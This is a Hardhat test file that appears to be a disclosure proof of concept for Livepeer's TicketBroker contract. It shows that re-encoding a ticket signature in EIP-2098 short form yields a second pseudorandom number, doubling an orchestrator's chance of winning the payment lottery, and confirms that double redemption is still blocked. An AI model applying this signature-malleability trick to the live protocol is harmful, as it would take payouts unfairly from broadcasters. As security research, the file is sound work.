import {constants} from "../../utils/constants"
import {createWinningTicket, getTicketHash} from "../helpers/ticket"
import signMsg, {
    flipV,
    getEIP2098V,
    getLongSigV,
    to2098Format
} from "../helpers/signMsg"

import chai, {expect} from "chai"
import {solidity} from "ethereum-waffle"
import {ethers} from "hardhat"
import setupIntegrationTest from "../helpers/setupIntegrationTest"

chai.use(solidity)

// TODO: move to separate util
export const resetNetwork = async () => {
    await hre.network.provider.request({
        method: "hardhat_reset",
        params: []
    })
}

/**
 * Prove that:
 * - 1) the conversion from long signature to eip-2098 compliant signature leads to the generation of a different pseudorandom number
 * - 2) the orchestrator has at their disposal two different pseudorandom numbers which grant them twice as much the probability they should have to be the PM winners as per protocol design
 * - 3) the vulnerability is only limited to the probability of winning the lottery and does not affect the redemption phase whereby a an orchestrator would be able to claim their lottery prize twice - the eligibility of the two pseudorandom numbers is always mutually exclusive
 *
 */

describe("Exploit PoC", () => {
    const recipientRand = 5
    const faceValue = 1000
    const deposit = ethers.utils.parseEther("1")
    const reserve = ethers.utils.parseEther("1")

    // accounts
    let transcoder
    let broadcaster

    // contracts
    let controller
    let broker
    let bondingManager
    let roundsManager
    let minter
    let token

    let roundLength
    let ticket

    const blockNumber = 0

    beforeEach(async () => {
        ;[transcoder, broadcaster] = await ethers.getSigners()

        const fixture = await setupIntegrationTest()

        broker = await ethers.getContractAt(
            "TicketBroker",
            fixture.TicketBroker.address
        )

        controller = await ethers.getContractAt(
            "Controller",
            fixture.Controller.address
        )
        await controller.unpause()

        bondingManager = await ethers.getContractAt(
            "BondingManager",
            fixture.BondingManager.address
        )
        roundsManager = await ethers.getContractAt(
            "AdjustableRoundsManager",
            fixture.AdjustableRoundsManager.address
        )
        token = await ethers.getContractAt(
            "LivepeerToken",
            fixture.LivepeerToken.address
        )
        minter = await ethers.getContractAt("Minter", fixture.Minter.address)

        const amount = ethers.BigNumber.from(10).mul(
            constants.TOKEN_UNIT.toString()
        )
        await token.connect(transcoder).transfer(transcoder.address, amount)

        // Register transcoder
        await token.connect(transcoder).approve(bondingManager.address, amount)
        await bondingManager
            .connect(transcoder)
            .bond(amount, transcoder.address)
        await bondingManager.connect(transcoder).transcoder(0, 0)

        roundLength = await roundsManager.roundLength()
        await roundsManager.mineBlocks(roundLength.mul(1000))
        await roundsManager.setBlockHash(
            ethers.utils.solidityKeccak256(["string"], ["foo"])
        )
        await roundsManager.initializeRound()

        // fund deposit/reserves
        await broker.connect(broadcaster).fundDeposit({value: deposit})
        await broker.connect(broadcaster).fundReserve({value: reserve})
        expect(
            await ethers.provider.getBalance(minter.address),
            "wrong broadcaster balance"
        ).to.equal(deposit.add(reserve))

        // create ticket
        const block = await roundsManager.blockNum()
        const creationRound = await roundsManager.currentRound()
        const creationRoundBlockHash = await roundsManager.blockHash(block)
        const auxData = ethers.utils.solidityPack(
            ["uint256", "bytes32"],
            [creationRound, creationRoundBlockHash]
        )
        ticket = createWinningTicket(
            transcoder.address,
            broadcaster.address,
            recipientRand,
            faceValue,
            auxData
        )

        const updatedBlockNumber = await ethers.provider.getBlockNumber()
        if (blockNumber !== 0) {
            // check to ensure that resetting the network after each test leads to the same block number
            expect(blockNumber, "different block-number scenario").to.be.eq(
                updatedBlockNumber
            )
        }
        blockNumber = updatedBlockNumber
    })

    afterEach(async () => {
        await resetNetwork()
    })

    // see 1) and 2)
    it("under the max `winProb` value, a ticket has two signature formats that are both eligible to win the lottery", async () => {
        const BrokerMock = await ethers.getContractFactory(
            "TickerBrokerExtendedMock"
        )
        const brokerMock = await BrokerMock.deploy(controller.address)
        await brokerMock.deployed()
        const longSignature = await signMsg(
            getTicketHash(ticket),
            ticket.sender
        )
        const eip2098Signature = await to2098Format(longSignature)

        const hasLongSignatureWon =
            await brokerMock.validateAndCheckTicketOutcome(
                ticket.sender,
                getTicketHash(ticket),
                longSignature,
                recipientRand,
                ticket.winProb
            )
        const longSignatureToNumber = await brokerMock.checkResult(
            longSignature,
            recipientRand
        )

        const hasEIP2098SignatureWon =
            await brokerMock.validateAndCheckTicketOutcome(
                ticket.sender,
                getTicketHash(ticket),
                eip2098Signature,
                recipientRand,
                ticket.winProb
            )

        const eip2098SignatureToNumber = await brokerMock.checkResult(
            eip2098Signature,
            recipientRand
        )

        expect(longSignature, "signatures are identical").to.not.be.eq(
            eip2098Signature
        )
        expect(
            longSignatureToNumber,
            "signature-generated pseudorandom numbers are identical"
        ).to.not.be.eq(eip2098SignatureToNumber)
        expect(hasLongSignatureWon, "long signature not eligible").to.be.true
        expect(hasEIP2098SignatureWon, "2098-eip signature not eligible").to.be
            .true

        // / flipping v value
        const flippedLongSignature = flipV(longSignature)
        const flippedEIP2098Signature = to2098Format(flippedLongSignature)

        expect(
            getLongSigV(flippedLongSignature),
            "wrong long v value"
        ).to.be.eq(getLongSigV(longSignature) === 27 ? 28 : 27)
        expect(
            getEIP2098V(flippedEIP2098Signature),
            "wrong eip2098 v value"
        ).to.be.eq(getEIP2098V(eip2098Signature) === 27 ? 28 : 27)

        await expect(
            brokerMock.validateAndCheckTicketOutcome(
                ticket.sender,
                getTicketHash(ticket),
                flippedEIP2098Signature,
                recipientRand,
                ticket.winProb
            )
        ).to.be.revertedWith("invalid signature over ticket hash")

        await expect(
            brokerMock.validateAndCheckTicketOutcome(
                ticket.sender,
                getTicketHash(ticket),
                flippedLongSignature,
                recipientRand,
                ticket.winProb
            )
        ).to.be.revertedWith("invalid signature over ticket hash")
    })

    // see 3)
    it("if an orchestrator redeems a winning ticket with the long-signature format, they should not be able to redeem it again with the eip2098 signature format", async () => {
        const deposit = (await broker.getSenderInfo(broadcaster.address)).sender
            .deposit

        const senderSig = await signMsg(
            getTicketHash(ticket),
            broadcaster.address
        )

        const sig2098 = await to2098Format(senderSig)

        await broker
            .connect(transcoder)
            .redeemWinningTicket(ticket, senderSig, recipientRand)

        await expect(
            broker
                .connect(transcoder)
                .redeemWinningTicket(ticket, sig2098, recipientRand)
        ).to.be.revertedWith("ticket is used")

        const endDeposit = (await broker.getSenderInfo(broadcaster.address))
            .sender.deposit

        expect(endDeposit, "wrong endDeposit").to.equal(
            deposit.sub(ticket.faceValue)
        )

        const round = await roundsManager.currentRound()

        expect(
            await bondingManager.pendingFees(transcoder.address, round)
        ).to.equal(faceValue)
    })

    // see 3)
    it("if an orchestrator redeems a winning ticket with the eip2098 long-signature format, they should not be able to redeem it again with the long-signature format", async () => {
        const deposit = (await broker.getSenderInfo(broadcaster.address)).sender
            .deposit

        const senderSig = await signMsg(
            getTicketHash(ticket),
            broadcaster.address
        )

        const sig2098 = await to2098Format(senderSig)

        await broker
            .connect(transcoder)
            .redeemWinningTicket(ticket, sig2098, recipientRand)

        await expect(
            broker
                .connect(transcoder)
                .redeemWinningTicket(ticket, senderSig, recipientRand)
        ).to.be.revertedWith("ticket is used")

        const endDeposit = (await broker.getSenderInfo(broadcaster.address))
            .sender.deposit

        expect(endDeposit, "wrong endDeposit").to.equal(
            deposit.sub(ticket.faceValue)
        )

        const round = await roundsManager.currentRound()

        expect(
            await bondingManager.pendingFees(transcoder.address, round)
        ).to.equal(faceValue)
    })
})
